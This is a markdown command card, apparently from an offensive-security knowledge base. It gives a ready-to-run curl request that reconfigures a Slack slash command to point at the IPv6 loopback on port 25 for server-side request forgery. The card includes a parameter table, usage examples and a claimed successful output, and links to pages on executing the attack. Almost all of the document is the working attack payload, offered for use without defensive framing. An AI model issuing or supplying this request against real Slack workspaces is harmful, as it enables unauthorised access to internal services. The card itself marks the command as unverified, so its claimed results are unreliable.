---
data: >-
  curl -X POST https://agarri.slack.com/services/4814366410 -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "crumb=s-1431286469-c73f073ed6-%E2%98%83&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:25/&method=GET&in_autocomplete=on&desc=&usage=&label="
tags:
  - ssrf
  - config
type: command
output: HTTP/1.1 200 OK - Configuration updated
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.354Z'
id: 8a126e24-50c8-4827-b696-e1a1641fa7fc
verified: false
validated: true
submitted: true
---
# configure-slack-ssrf-slash-command

## Command

```bash
curl -X POST https://agarri.slack.com/services/4814366410 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "crumb=s-1431286469-c73f073ed6-%E2%98%83&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:25/&method=GET&in_autocomplete=on&desc=&usage=&label="
```

## Description

Updates a Slack slash command's URL to an IPv6 loopback endpoint for SSRF exploitation. Use after obtaining the CSRF crumb from the integration page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `crumb` | CSRF token from session | Yes |
| `url` | Target URL, e.g., http://[::]:25/ | Yes |
| `command` | Slash command name, e.g., /ssrf | Yes |
| `edit_service` | Flag to edit (1) | Yes |
| `method` | HTTP method (GET) | No |

## Examples

### Basic Usage

```bash
curl -X POST https://your-slack.com/services/ID \
  -d "crumb=TOKEN&edit_service=1&command=/test&url=http://[::]:PORT&method=GET"
```

### Advanced Usage

```bash
curl -X POST https://agarri.slack.com/services/4814366410 \
  -d "...&in_autocomplete=on&desc=Test SSRF"
```

## Expected Output

HTTP 200 OK with HTML confirming update, or redirect to services page.

## Related

- [[commands/execute-slack-ssrf-command]]
- [[procedures/Configure-Slack-Slash-Command-for-SSRF-via-IPv6]]
